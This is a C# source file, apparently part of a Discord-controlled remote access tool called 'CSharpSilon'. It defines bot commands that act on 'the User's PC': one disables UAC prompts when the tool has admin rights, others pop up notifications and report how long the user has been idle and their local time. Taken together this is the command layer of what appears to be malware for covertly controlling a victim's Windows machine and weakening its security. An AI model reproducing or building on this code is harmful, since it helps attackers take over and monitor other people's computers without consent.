using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Discord.Commands;

namespace CSharpSilon.cmds
{
    public class UsersSystem : ModuleBase<SocketCommandContext>
    {
        [DllImport("Kernel32.dll")]
        private static extern uint GetLastError();
        internal struct LASTINPUTINFO
        {
            public uint cbSize;

            public uint dwTime;
        }
        
        
        [DllImport("User32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
        
        
        [Command("diableuac"), Alias("duac"), Summary("Disables The User's UAC")]
        public async Task DisableUAC()
        {
            if (Utils.App.IsAdmin())
            {
                await ReplyAsync("Disabling UAC Prompts");
                Utils.UAC.Run();
            }
            else
            {
                await ReplyAsync("This Requires App To Have Admin Privledges");
            }
        }
        
        [Command("notify"), Summary("Creates And Shows A Notification On The User's PC. The Title Cannot Have Spaces. This WILL Show The Process Being Used.")]
        public async Task Notify(string title,[Remainder] string msg)
        {
            var noty = new NotifyIcon()
            {
                Icon = SystemIcons.Information,
                Visible = true,
                BalloonTipText = msg,
                BalloonTipTitle = title,
                BalloonTipIcon = ToolTipIcon.None,
            };
            noty.ShowBalloonTip(0);
            await ReplyAsync("Notification Sent.");
        }
        
        [Command("idletime"), Alias("it"), Summary("Gets The User's Idle Time.")]
        public async Task IdleTime()
        {
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)Marshal.SizeOf(lastInPut);
            GetLastInputInfo(ref lastInPut);

            await ReplyAsync($"User Has Been Idle For: {((uint)Environment.TickCount - lastInPut.dwTime) / 1000} Seconds");
        }
        
        [Command("datettime"), Alias("dt", "time"), Summary("Gets The User's Current Time.")]
        public async Task Time()
        {
            await ReplyAsync($"Current Time: {DateTime.Now.ToString(@"MM\/dd\/yyyy h\:mm tt")}");
        }
        
    }
}